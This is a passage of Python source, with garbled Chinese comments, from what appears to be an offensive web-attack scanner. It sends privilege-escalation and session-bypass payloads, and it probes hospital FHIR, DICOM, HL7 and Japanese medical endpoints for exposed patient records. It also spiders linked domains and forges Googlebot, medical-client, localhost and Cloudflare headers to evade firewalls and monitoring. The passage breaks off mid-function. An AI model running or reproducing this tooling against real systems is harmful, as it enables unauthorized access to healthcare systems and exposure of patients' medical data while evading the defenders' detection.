    async def _execute_cookie_time_attacks(self, session: aiohttp.ClientSession, vector: Dict, endpoints: List[str]) -> List[Dict]:
        """æ‰§è¡ŒCookieæ—¶é—´æ“ä½œæ”»å‡»"""
        results = []
        
        for endpoint in endpoints[:3]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
            full_url = urljoin(self.target_url, endpoint)
            
            for cookie_variant in vector.get('skewed_cookies', [])[:2]:  # é™åˆ¶å˜ä½“æ•°é‡
                try:
                    headers = {
                        'Cookie': cookie_variant,
                        'X-Temporal-Attack': 'cookie_manipulation'
                    }
                    
                    async with session.get(full_url, headers=headers, timeout=8, ssl=False) as resp:
                        success = resp.status in [200, 201, 202]
                        
                        if success:
                            print(f"    [] Cookieæ—¶é—´æ”»å‡»æˆåŠŸ: {endpoint}")
                        
                        results.append({
                            'attack_type': 'cookie_time_manipulation',
                            'endpoint': endpoint,
                            'cookie_used': cookie_variant,
                            'response_status': resp.status,
                            'success': success,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                except Exception as e:
                    results.append({
                        'attack_type': 'cookie_time_manipulation',
                        'endpoint': endpoint,
                        'error': str(e),
                        'success': False,
                        'timestamp': datetime.now().isoformat()
                    })
        
        return results
    
    async def _execute_session_temporal_bypass(self, session: aiohttp.ClientSession, vector: Dict, endpoints: List[str]) -> List[Dict]:
        """æ‰§è¡Œä¼šè¯æ—¶é—´ç»•è¿‡æ”»å‡»"""
        results = []
        
        bypass_headers = [
            {'X-Session-Time': '1970-01-01', 'X-Time-Override': 'true'},
            {'X-Historical-Access': 'enabled', 'X-Temporal-Bypass': 'admin'},
            {'X-Session-Rewind': '2020-01-01', 'X-Emergency-Access': 'true'},
            {'X-Time-Travel': 'backwards', 'X-Admin-Session': 'historical'}
        ]
        
        for endpoint in endpoints[:2]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
            full_url = urljoin(self.target_url, endpoint)
            
            for headers in bypass_headers[:2]:  # é™åˆ¶å¤´éƒ¨æ•°é‡
                try:
                    async with session.get(full_url, headers=headers, timeout=8, ssl=False) as resp:
                        success = resp.status in [200, 201, 202]
                        
                        if success:
                            content = await resp.text()
                            # æ£€æŸ¥æ˜¯å¦æˆåŠŸç»•è¿‡è®¤è¯
                            bypass_indicators = ['dashboard', 'admin', 'profile', 'welcome', 'user', 'settings']
                            actual_bypass = any(indicator in content.lower() for indicator in bypass_indicators)
                            
                            if actual_bypass:
                                print(f"    [ğŸš¨] ä¼šè¯æ—¶é—´ç»•è¿‡æˆåŠŸ: {endpoint}")
                                success = True
                        
                        results.append({
                            'attack_type': 'session_temporal_bypass',
                            'endpoint': endpoint,
                            'headers_used': headers,
                            'response_status': resp.status,
                            'success': success,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                except Exception as e:
                    results.append({
                        'attack_type': 'session_temporal_bypass',
                        'endpoint': endpoint,
                        'error': str(e),
                        'success': False,
                        'timestamp': datetime.now().isoformat()
                    })
        
        return results
    
    async def _execute_time_privilege_escalation(self, session: aiohttp.ClientSession, vector: Dict, endpoints: List[str]) -> List[Dict]:
        """æ‰§è¡ŒåŸºäºæ—¶é—´çš„æƒé™æå‡æ”»å‡»"""
        results = []
        
        privilege_payloads = [
            {
                'role': 'administrator',
                'valid_from': '1970-01-01',
                'expires': '2099-12-31',
                'time_override': True
            },
            {
                'user_type': 'admin',
                'created_at': '2020-01-01',
                'last_login': '1970-01-01',
                'session_duration': 99999999
            },
            {
                'privilege_level': 'superuser',
                'granted_date': '1970-01-01',
                'revoked_date': None,
                'temporal_access': True
            }
        ]
        
        escalation_endpoints = ['/api/user/profile', '/api/account/update', '/api/users/me']
        
        for endpoint in escalation_endpoints[:2]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
            full_url = urljoin(self.target_url, endpoint)
            
            for payload in privilege_payloads[:2]:  # é™åˆ¶è½½è·æ•°é‡
                try:
                    headers = {
                        'Content-Type': 'application/json',
                        'X-Time-Privilege-Escalation': 'true',
                        'X-Historical-Admin': 'enabled'
                    }
                    
                    # å°è¯•PUTæ–¹æ³•è¿›è¡Œæƒé™æå‡
                    async with session.put(full_url, json=payload, headers=headers, timeout=8, ssl=False) as resp:
                        success = resp.status in [200, 201, 202]
                        
                        if success:
                            print(f"    [ğŸš¨] æ—¶é—´æƒé™æå‡æˆåŠŸ: {endpoint}")
                        
                        results.append({
                            'attack_type': 'time_privilege_escalation',
                            'endpoint': endpoint,
                            'payload_used': payload,
                            'response_status': resp.status,
                            'method': 'PUT',
                            'success': success,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                except Exception as e:
                    results.append({
                        'attack_type': 'time_privilege_escalation',
                        'endpoint': endpoint,
                        'error': str(e),
                        'success': False,
                        'timestamp': datetime.now().isoformat()
                    })
        
        return results

    #  åŒ»ç–—ç³»ç»Ÿä¸“é¡¹æ£€æµ‹åŠŸèƒ½ - ä»asset_mapper.pyç§»æ¤
    async def medical_system_detection(self):
        """åŒ»ç–—ç³»ç»Ÿä¸“é¡¹æ£€æµ‹ - å…³é”®ç¼ºå¤±åŠŸèƒ½è¡¥é½"""
        print("\n[] åŒ»ç–—ç³»ç»Ÿä¸“é¡¹æ£€æµ‹å¯åŠ¨...")
        
        # FHIR APIç«¯ç‚¹æ£€æµ‹ï¼ˆFast Healthcare Interoperability Resourcesï¼‰
        fhir_endpoints = [
            '/fhir/Patient',        # æ‚£è€…ä¿¡æ¯
            '/fhir/Appointment',    # é¢„çº¦ä¿¡æ¯
            '/fhir/Medication',     # è¯ç‰©ä¿¡æ¯
            '/fhir/metadata',       # å…ƒæ•°æ®ï¼ˆé€šå¸¸æš´éœ²ç³»ç»Ÿç‰ˆæœ¬ï¼‰
            '/fhir/Observation',    # è§‚å¯Ÿè®°å½•
            '/fhir/Practitioner',   # åŒ»å¸ˆä¿¡æ¯
            '/fhir/Organization',   # æœºæ„ä¿¡æ¯
            '/fhir/MedicationRequest', # å¤„æ–¹è¯·æ±‚
            '/fhir/DiagnosticReport', # è¯Šæ–­æŠ¥å‘Š
            '/fhir/Condition'       # ç—…æƒ…çŠ¶æ€
        ]
        
        # DICOM/PACSç«¯ç‚¹æ£€æµ‹ï¼ˆåŒ»å­¦å½±åƒç³»ç»Ÿï¼‰
        dicom_endpoints = [
            '/dicom-web/studies',   # DICOM Webç ”ç©¶
            '/pacs/studies',        # PACSç ”ç©¶
            '/wado',               # Web Access to DICOM Objects
            '/dcm4chee',           # DCM4CHEEå¼€æºPACS
            '/orthanc',            # Orthancè½»é‡çº§DICOMæœåŠ¡å™¨
            '/conquest',           # ConQuest DICOMæœåŠ¡å™¨
            '/dcm',                # é€šç”¨DICOMç«¯ç‚¹
            '/dicom/viewer',       # DICOMæŸ¥çœ‹å™¨
            '/imaging/api'         # å½±åƒAPI
        ]
        
        # HL7/åŒ»ç–—é›†æˆç«¯ç‚¹ï¼ˆHealth Level 7ï¼‰
        hl7_endpoints = [
            '/hl7/messages',        # HL7æ¶ˆæ¯
            '/hie/patient/search',  # å¥åº·ä¿¡æ¯äº¤æ¢
            '/emr/api',            # ç”µå­ç—…å†API
            '/his/api',            # åŒ»é™¢ä¿¡æ¯ç³»ç»ŸAPI
            '/ris/api',            # æ”¾å°„ä¿¡æ¯ç³»ç»ŸAPI
            '/lis/api',            # å®éªŒå®¤ä¿¡æ¯ç³»ç»ŸAPI
            '/cis/api',            # ä¸´åºŠä¿¡æ¯ç³»ç»ŸAPI
            '/mirth/api',          # Mirth Connecté›†æˆå¼•æ“
            '/interface/engine'     # æ¥å£å¼•æ“
        ]
        
        # æ—¥æœ¬ç‰¹å®šåŒ»ç–—ç«¯ç‚¹
        japan_medical_endpoints = [
            '/recepta/api',        # ç”µå­å¤„æ–¹ç³»ç»Ÿ
            '/orca/api',          # ORCAåŒ»äº‹è®¡ç®—æœºç³»ç»Ÿ
            '/medis/api',         # MEDISæ ‡å‡†
            '/jlac/api',          # æ—¥æœ¬ä¸´åºŠæ£€æŸ¥æ ‡å‡†åŒ–å§”å‘˜ä¼š
            '/rezept/api',        # æ—¥æœ¬è¯Šç–—æŠ¥é…¬è¯·æ±‚
            '/karte/api'          # ç”µå­ç—…å†å¡ç‰¹
        ]
        
        all_medical_endpoints = fhir_endpoints + dicom_endpoints + hl7_endpoints + japan_medical_endpoints
        
        medical_findings = []
        detected_systems = set()
        
        print(f"[+] å¼€å§‹æ£€æµ‹ {len(all_medical_endpoints)} ä¸ªåŒ»ç–—ç³»ç»Ÿç«¯ç‚¹...")
        
        # ä½¿ç”¨çœŸæ­£çš„å¹¶å‘æ‰§è¡Œ
        async with aiohttp.ClientSession() as session:
            # åˆ›å»ºå¹¶å‘ä»»åŠ¡
            async def check_medical_endpoint(endpoint):
                url = urljoin(self.target_url, endpoint)
                try:
                    async with session.get(url, timeout=10, ssl=False) as resp:
                        if resp.status in [200, 401, 403, 404]:  # åŒ…æ‹¬404ï¼Œå› ä¸ºå¯èƒ½å­˜åœ¨ä½†éœ€è¦è®¤è¯
                            content_type = resp.headers.get('Content-Type', '')
                            server = resp.headers.get('Server', '')
                            
                            # å°è¯•è¯»å–å“åº”å†…å®¹ï¼ˆé™åˆ¶å¤§å°ï¼‰
                            try:
                                if resp.status == 200:
                                    content = await resp.text()
                                    content = content[:5000]  # é™åˆ¶å†…å®¹å¤§å°
                                else:
                                    content = ""
                            except:
                                content = ""
                            
                            # åˆ†æç³»ç»Ÿç±»å‹
                            system_type = self._analyze_medical_system_type(endpoint, resp.status, content, server)
                            
                            return {
                                'endpoint': endpoint,
                                'url': url,
                                'status': resp.status,
                                'system_type': system_type,
                                'content_type': content_type,
                                'server': server,
                                'content_preview': content[:200] if content else "",
                                'risk_level': self._assess_medical_endpoint_risk(endpoint, resp.status, content),
                                'compliance_impact': self._assess_compliance_impact(endpoint, system_type)
                            }
                except asyncio.TimeoutError:
                    return None
                except Exception as e:
                    return None
            
            # å¹¶å‘æ‰§è¡Œæ‰€æœ‰æ£€æµ‹ä»»åŠ¡
            tasks = [check_medical_endpoint(endpoint) for endpoint in all_medical_endpoints]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # æ”¶é›†æœ‰æ•ˆç»“æœ
            for result in results:
                if result and isinstance(result, dict):
                    medical_findings.append(result)
                    detected_systems.add(result['system_type'])
        
        # åˆ†æç»“æœ
        print(f"[] åŒ»ç–—ç³»ç»Ÿæ£€æµ‹ç»“æœ:")
        print(f"    å‘ç°ç«¯ç‚¹: {len(medical_findings)}")
        print(f"    ç³»ç»Ÿç±»å‹: {len(detected_systems)}")
        
        if medical_findings:
            # æŒ‰é£é™©ç­‰çº§åˆ†ç±»
            critical_findings = [f for f in medical_findings if f['risk_level'] == 'critical']
            high_findings = [f for f in medical_findings if f['risk_level'] == 'high']
            
            print(f"    ä¸¥é‡é£é™©: {len(critical_findings)}")
            print(f"    é«˜é£é™©: {len(high_findings)}")
            
            # ä¿å­˜å‘ç°åˆ°æ•°æ®è®°å½•
            for finding in medical_findings:
                record = DataRecord(
                    record_id=f"medical_{finding['endpoint'].replace('/', '_')}_{int(time.time())}",
                    record_type="medical_system_detection",
                    data=finding,
                    source_url=finding['url'],
                    timestamp=datetime.now().isoformat(),
                    metadata={
                        'system_type': finding['system_type'],
                        'risk_level': finding['risk_level'],
                        'compliance_impact': finding['compliance_impact']
                    }
                )
                self.data_records.append(record)
            
            # ç‰¹åˆ«æŠ¥å‘Šä¸¥é‡å‘ç°
            if critical_findings:
                print(f"\n[ğŸš¨] å‘ç° {len(critical_findings)} ä¸ªä¸¥é‡åŒ»ç–—å®‰å…¨é—®é¢˜:")
                for finding in critical_findings[:5]:  # åªæ˜¾ç¤ºå‰5ä¸ª
                    print(f"    â””â”€ {finding['endpoint']} ({finding['system_type']}) - {finding['compliance_impact']}")
        
        return medical_findings
    
    def _analyze_medical_system_type(self, endpoint: str, status: int, content: str, server: str) -> str:
        """åˆ†æåŒ»ç–—ç³»ç»Ÿç±»å‹"""
        endpoint_lower = endpoint.lower()
        content_lower = content.lower() if content else ""
        server_lower = server.lower()
        
        # FHIRç³»ç»Ÿè¯†åˆ«
        if '/fhir/' in endpoint_lower or 'fhir' in content_lower:
            if 'hapi' in content_lower or 'hapi' in server_lower:
                return "HAPI_FHIR_Server"
            elif 'microsoft' in content_lower or 'azure' in content_lower:
                return "Azure_FHIR_Service"
            elif 'google' in content_lower:
                return "Google_Cloud_FHIR"
            else:
                return "Generic_FHIR_Server"
        
        # DICOM/PACSç³»ç»Ÿè¯†åˆ«
        elif any(keyword in endpoint_lower for keyword in ['dicom', 'pacs', 'wado', 'orthanc', 'dcm4chee']):
            if 'orthanc' in endpoint_lower or 'orthanc' in content_lower:
                return "Orthanc_DICOM_Server"
            elif 'dcm4chee' in endpoint_lower or 'dcm4chee' in content_lower:
                return "DCM4CHEE_PACS"
            elif 'conquest' in endpoint_lower or 'conquest' in content_lower:
                return "ConQuest_DICOM"
            else:
                return "Generic_DICOM_PACS"
        
        # HL7ç³»ç»Ÿè¯†åˆ«
        elif any(keyword in endpoint_lower for keyword in ['hl7', 'hie', 'emr', 'his', 'ris', 'lis']):
            if 'mirth' in endpoint_lower or 'mirth' in content_lower:
                return "Mirth_Connect"
            elif 'epic' in content_lower:
                return "Epic_EMR"
            elif 'cerner' in content_lower:
                return "Cerner_EMR"
            else:
                return "Generic_HL7_System"
        
        # æ—¥æœ¬ç‰¹å®šç³»ç»Ÿ
        elif any(keyword in endpoint_lower for keyword in ['recepta', 'orca', 'rezept', 'karte']):
            if 'orca' in endpoint_lower:
                return "ORCA_Medical_System"
            elif 'recepta' in endpoint_lower:
                return "Electronic_Prescription_System"
            else:
                return "Japan_Medical_System"
        
        return "Unknown_Medical_System"
    
    def _assess_medical_endpoint_risk(self, endpoint: str, status: int, content: str) -> str:
        """è¯„ä¼°åŒ»ç–—ç«¯ç‚¹é£é™©ç­‰çº§"""
        endpoint_lower = endpoint.lower()
        
        # ä¸¥é‡é£é™©æŒ‡æ ‡
        critical_indicators = [
            'patient', 'medication', 'prescription', 'diagnostic',
            'practitioner', 'condition', '/fhir/patient'
        ]
        
        # é«˜é£é™©æŒ‡æ ‡
        high_indicators = [
            'appointment', 'observation', 'organization', 
            'dicom', 'pacs', 'hl7', 'emr'
        ]
        
        # æ£€æŸ¥çŠ¶æ€ç 
        if status == 200:
            # 200çŠ¶æ€ç  + æ•æ„Ÿç«¯ç‚¹ = ä¸¥é‡é£é™©
            if any(indicator in endpoint_lower for indicator in critical_indicators):
                return 'critical'
            elif any(indicator in endpoint_lower for indicator in high_indicators):
                return 'high'
            else:
                return 'medium'
        
        elif status in [401, 403]:
            # éœ€è¦è®¤è¯ä½†å­˜åœ¨ = é«˜é£é™©
            if any(indicator in endpoint_lower for indicator in critical_indicators):
                return 'high'
            else:
                return 'medium'
        
        else:
            return 'low'
    
    def _assess_compliance_impact(self, endpoint: str, system_type: str) -> str:
        """è¯„ä¼°åˆè§„æ€§å½±å“"""
        endpoint_lower = endpoint.lower()
        
        # HIPAA/GDPRé«˜æ•æ„Ÿåº¦ç«¯ç‚¹
        if any(keyword in endpoint_lower for keyword in ['patient', 'medication', 'prescription', 'diagnostic']):
            return "HIPAA_GDPR_Critical"
        
        # åŒ»ç–—è®¾å¤‡æ•°æ®ï¼ˆFDAç›‘ç®¡ï¼‰
        elif any(keyword in endpoint_lower for keyword in ['dicom', 'pacs', 'imaging']):
            return "FDA_Medical_Device_Data"
        
        # æ—¥æœ¬ä¸ªäººæƒ…æŠ¥ä¿æŠ¤æ³•
        elif 'japan' in system_type.lower() or any(keyword in endpoint_lower for keyword in ['recepta', 'orca']):
            return "Japan_Personal_Information_Protection"
        
        # ä¸€èˆ¬åŒ»ç–—åˆè§„
        else:
            return "General_Medical_Compliance"

    #  é“¾å¼è¿½è¸ªç®¡ç†å™¨ - é‡è¦ç¼ºå¤±åŠŸèƒ½
    class ChainTrackingManager:
        """é“¾å¼è¿½è¸ªç®¡ç†å™¨ - ç®¡ç†äº’è”èµ„äº§çš„å‘ç°å’Œæ‰«æ"""
        
        def __init__(self, parent_scanner):
            self.parent = parent_scanner
            self.discovered_chains = {}  # é“¾å¼å…³ç³»å›¾
            self.pending_targets = deque()  # å¾…æ‰«æç›®æ ‡é˜Ÿåˆ—
            self.scanned_targets = set()   # å·²æ‰«æç›®æ ‡é›†åˆ
            self.chain_depth_limit = 3     # é“¾å¼æ·±åº¦é™åˆ¶
        
        async def discover_interconnected_assets(self, initial_targets: List[str]) -> Dict:
            """å‘ç°äº’è”èµ„äº§"""
            print(f"\n[] é“¾å¼è¿½è¸ªç®¡ç†å™¨å¯åŠ¨ï¼Œåˆå§‹ç›®æ ‡: {len(initial_targets)}")
            
            # åˆå§‹åŒ–è¿½è¸ªé˜Ÿåˆ—
            for target in initial_targets:
                self.pending_targets.append((target, 0))  # (ç›®æ ‡, æ·±åº¦)
            
            discovered_assets = {}
            
            while self.pending_targets and len(self.scanned_targets) < 50:  # é™åˆ¶æ€»æ‰«ææ•°é‡
                current_target, depth = self.pending_targets.popleft()
                
                if current_target in self.scanned_targets or depth > self.chain_depth_limit:
                    continue
                
                self.scanned_targets.add(current_target)
                print(f"[+] æ‰«æé“¾å¼ç›®æ ‡: {current_target} (æ·±åº¦: {depth})")
                
                # å‘ç°å…³è”èµ„äº§
                related_assets = await self._discover_related_assets(current_target)
                
                if related_assets:
                    discovered_assets[current_target] = related_assets
                    
                    # å°†å‘ç°çš„èµ„äº§æ·»åŠ åˆ°å¾…æ‰«æé˜Ÿåˆ—
                    for asset in related_assets.get('subdomains', []):
                        if asset not in self.scanned_targets:
                            self.pending_targets.append((asset, depth + 1))
            
            return discovered_assets
        
        async def _discover_related_assets(self, target: str) -> Dict:
            """å‘ç°ä¸ç›®æ ‡ç›¸å…³çš„èµ„äº§"""
            related_assets = {
                'subdomains': [],
                'internal_hosts': [],
                'api_endpoints': [],
                'cdn_origins': []
            }
            
            try:
                async with aiohttp.ClientSession() as session:
                    # 1. ä»robots.txtå‘ç°
                    robots_url = f"https://{target}/robots.txt"
                    async with session.get(robots_url, timeout=10, ssl=False) as resp:
                        if resp.status == 200:
                            robots_content = await resp.text()
                            # æå–Sitemapå’ŒDisallowä¸­çš„åŸŸå
                            related_assets['subdomains'].extend(
                                self._extract_domains_from_robots(robots_content, target)
                            )
                    
                    # 2. ä»sitemap.xmlå‘ç°
                    sitemap_url = f"https://{target}/sitemap.xml"
                    async with session.get(sitemap_url, timeout=10, ssl=False) as resp:
                        if resp.status == 200:
                            sitemap_content = await resp.text()
                            related_assets['subdomains'].extend(
                                self._extract_domains_from_sitemap(sitemap_content, target)
                            )
                    
                    # 3. ä»ä¸»é¡µé¢å‘ç°
                    main_url = f"https://{target}"
                    async with session.get(main_url, timeout=10, ssl=False) as resp:
                        if resp.status == 200:
                            page_content = await resp.text()
                            related_assets['subdomains'].extend(
                                self._extract_domains_from_html(page_content, target)
                            )
                            related_assets['api_endpoints'].extend(
                                self._extract_api_endpoints_from_html(page_content)
                            )
            
            except Exception as e:
                print(f"[] é“¾å¼å‘ç°å¤±è´¥ {target}: {e}")
            
            return related_assets
        
        def _extract_domains_from_robots(self, content: str, base_domain: str) -> List[str]:
            """ä»robots.txtæå–åŸŸå"""
            domains = []
            lines = content.split('\n')
            
            for line in lines:
                # æå–Sitemapä¸­çš„åŸŸå
                if line.startswith('Sitemap:'):
                    url = line.split(':', 1)[1].strip()
                    domain = urlparse(url).netloc
                    if domain and domain != base_domain:
                        domains.append(domain)
                
                # æå–Disallowä¸­çš„å­åŸŸåå¼•ç”¨
                elif line.startswith('Disallow:'):
                    path = line.split(':', 1)[1].strip()
                    if 'http' in path:
                        domain = urlparse(path).netloc
                        if domain and domain != base_domain:
                            domains.append(domain)
            
            return list(set(domains))
        
        def _extract_domains_from_sitemap(self, content: str, base_domain: str) -> List[str]:
            """ä»sitemap.xmlæå–åŸŸå"""
            domains = []
            
            # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æå–URL
            url_pattern = r'<loc>(.*?)</loc>'
            urls = re.findall(url_pattern, content)
            
            for url in urls:
                domain = urlparse(url).netloc
                if domain and domain != base_domain:
                    domains.append(domain)
            
            return list(set(domains))
        
        def _extract_domains_from_html(self, content: str, base_domain: str) -> List[str]:
            """ä»HTMLå†…å®¹æå–åŸŸå"""
            domains = []
            
            # æå–hrefå’Œsrcä¸­çš„åŸŸå
            url_pattern = r'(?:href|src)=["\']([^"\']+)["\']'
            urls = re.findall(url_pattern, content)
            
            for url in urls:
                if url.startswith('http'):
                    domain = urlparse(url).netloc
                    if domain and domain != base_domain and '.' in domain:
                        domains.append(domain)
            
            return list(set(domains))
        
        def _extract_api_endpoints_from_html(self, content: str) -> List[str]:
            """ä»HTMLå†…å®¹æå–APIç«¯ç‚¹"""
            endpoints = []
            
            # æå–JavaScriptä¸­çš„APIè°ƒç”¨
            api_patterns = [
                r'fetch\(["\']([^"\']+)["\']',
                r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']',
                r'\.ajax\(\s*["\']([^"\']+)["\']',
                r'/api/[^\s"\'<>]+',
                r'/rest/[^\s"\'<>]+',
                r'/graphql[^\s"\'<>]*'
            ]
            
            for pattern in api_patterns:
                matches = re.findall(pattern, content)
                endpoints.extend(matches)
            
            return list(set(endpoints))

    # ğŸ›¡ï¸ è¯·æ±‚ç»•è¿‡å¢å¼ºå™¨ - é«˜çº§åæ£€æµ‹åŠŸèƒ½
    class RequestBypassEnhancer:
        """è¯·æ±‚ç»•è¿‡å¢å¼ºå™¨ - å¤„ç†User-Agentè½®æ¢å’Œç°å®åŒ–è¯·æ±‚å¤´ç”Ÿæˆ"""
        
        def __init__(self):
            self.user_agents = [
                # ç°ä»£æµè§ˆå™¨ï¼ˆé«˜ä¼˜å…ˆçº§ï¼‰
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
                
                # ç§»åŠ¨è®¾å¤‡
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                
                # åŒ»ç–—ç‰¹å®šå·¥å…·ï¼ˆæ¬ºéª—æ€§ï¼‰
                'FHIR-Client/4.0.1 (Healthcare-System/1.0)',
                'DICOM-Viewer/3.2.1 (Medical-Workstation)',
                'HL7-Interface/2.5.1 (Hospital-Integration)',
                
                # æœç´¢å¼•æ“çˆ¬è™«ï¼ˆé«˜ä¿¡ä»»åº¦ï¼‰
                'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
                
                # ç›‘æ§å·¥å…·ï¼ˆç»•è¿‡ç›‘æ§æ£€æµ‹ï¼‰
                'Mozilla/5.0 (compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)',
                'StatusCake/2.0 (Status Monitor)',
                
                # APIå®¢æˆ·ç«¯
                'curl/8.5.0',
                'Postman/10.20.0',
                'HTTPie/3.2.0',
                'Python-requests/2.31.0'
            ]
            
            self.realistic_headers = {
                'chrome_windows': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9,ja;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'DNT': '1',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"'
                },
                
                'firefox_mac': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'DNT': '1',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document'
                },
                
                'medical_api': {
                    'Accept': 'application/fhir+json, application/json',
                    'Content-Type': 'application/fhir+json',
                    'X-FHIR-Version': '4.0.1',
                    'Accept-Language': 'en-US',
                    'Cache-Control': 'no-cache'
                },
                
                'api_client': {
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'application/json',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
            }
            
            self.current_ua_index = 0
            self.session_persistence = {}  # ä¼šè¯æŒä¹…åŒ–
        
        def get_realistic_headers(self, request_type: str = 'chrome_windows', target_url: str = "") -> Dict[str, str]:
            """ç”Ÿæˆç°å®åŒ–çš„è¯·æ±‚å¤´"""
            base_headers = self.realistic_headers.get(request_type, self.realistic_headers['chrome_windows']).copy()
            
            # åŠ¨æ€ç”ŸæˆRefererï¼ˆæé«˜çœŸå®æ€§ï¼‰
            if target_url:
                parsed = urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                
                # æ¨¡æ‹Ÿä»ä¸»é¡µå¯¼èˆªè€Œæ¥
                possible_referers = [
                    base_domain,
                    f"{base_domain}/",
                    f"{base_domain}/index.html",
                    f"{base_domain}/home",
                    f"{base_domain}/dashboard",
                    "https://www.google.com/",  # æ¨¡æ‹Ÿæœç´¢å¼•æ“æ¥æº
                    "https://www.bing.com/"
                ]
                
                import random
                base_headers['Referer'] = random.choice(possible_referers)
            
            # åŒ»ç–—ç³»ç»Ÿç‰¹å®šå¤´
            if request_type == 'medical_api':
                base_headers.update({
                    'X-Forwarded-For': self._generate_medical_ip(),
                    'X-Real-IP': self._generate_medical_ip(),
                    'X-Client-Version': '1.0.0',
                    'X-Request-ID': self._generate_request_id()
                })
            
            return base_headers
        
        def rotate_user_agent(self) -> str:
            """è½®æ¢User-Agent"""
            user_agent = self.user_agents[self.current_ua_index]
            self.current_ua_index = (self.current_ua_index + 1) % len(self.user_agents)
            return user_agent
        
        def get_bypass_headers(self, target_url: str, bypass_type: str = 'general') -> Dict[str, str]:
            """è·å–é’ˆå¯¹æ€§çš„ç»•è¿‡å¤´"""
            headers = {}
            
            # åŸºç¡€ç»•è¿‡å¤´
            if bypass_type == 'waf_bypass':
                headers.update({
                    'X-Originating-IP': '127.0.0.1',
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Remote-IP': '127.0.0.1',
                    'X-Remote-Addr': '127.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'X-Client-IP': '127.0.0.1',
                    'X-Forwarded-Host': 'localhost',
                    'X-Host': 'localhost'
                })
            
            # è´Ÿè½½å‡è¡¡å™¨ç»•è¿‡
            elif bypass_type == 'load_balancer':
                headers.update({
                    'X-Forwarded-Proto': 'https',
                    'X-Forwarded-Port': '443',
                    'X-Forwarded-Server': 'internal-server',
                    'X-Load-Balancer': 'nginx/1.20.1'
                })
            
            # CDNç»•è¿‡
            elif bypass_type == 'cdn_bypass':
                headers.update({
                    'CF-Connecting-IP': '127.0.0.1',
                    'CF-Ray': self._generate_cf_ray(),
                    'CF-Visitor': '{"scheme":"https"}',
                    'X-Forwarded-Proto': 'https',
                    'CloudFront-Viewer-Country': 'US'
                })
            
            # åŒ»ç–—ç³»ç»Ÿç‰¹å®šç»•è¿‡
            elif bypass_type == 'medical_bypass':
                headers.update({
                    'X-Hospital-Network': 'internal',
                    'X-Medical-Station': 'workstation-01',
                    'X-FHIR-Security': 'enabled',
                    'X-HL7-Version': '2.5.1',
                    'X-DICOM-Transfer-Syntax': '1.2.840.10008.1.2.1'
                })
            
            return headers
        
        def _generate_medical_ip(self) -> str:
            """ç”ŸæˆåŒ»ç–—æœºæ„å†…ç½‘IP"""
            import random
            # å¸¸è§åŒ»ç–—æœºæ„ç½‘æ®µ
            medical_subnets = [
                "10.{}.{}.{}",  # ç§æœ‰Aç±»
                "172.{}.{}.{}",  # ç§æœ‰Bç±»  
                "192.168.{}.{}"  # ç§æœ‰Cç±»
            ]
            
            subnet = random.choice(medical_subnets)
            
            if subnet.startswith("10."):
                return subnet.format(
                    random.randint(0, 255),
                    random.randint(0, 255), 
                    random.randint(1, 254)
                )
            elif subnet.startswith("172."):
                return subnet.format(
                    random.randint(16, 31),
                    random.randint(0, 255),
                    random.randint(1, 254)
                )
            else:  # 192.168
                return subnet.format(
                    random.randint(0, 255),
                    random.randint(1, 254)
                )
        
        def _generate_cf_ray(self) -> str:
            """ç”ŸæˆCloudFlare Ray ID"""
            import random
            import string
            return ''.join(random.choices(string.hexdigits.lower(), k=16)) + '-NRT'
        
        def _generate_request_id(self) -> str:
            """ç”Ÿæˆè¯·æ±‚ID"""
            import uuid
            return str(uuid.uuid4())
        
        def create_session_with_bypass(self, bypass_type: str = 'general') -> Dict[str, str]:
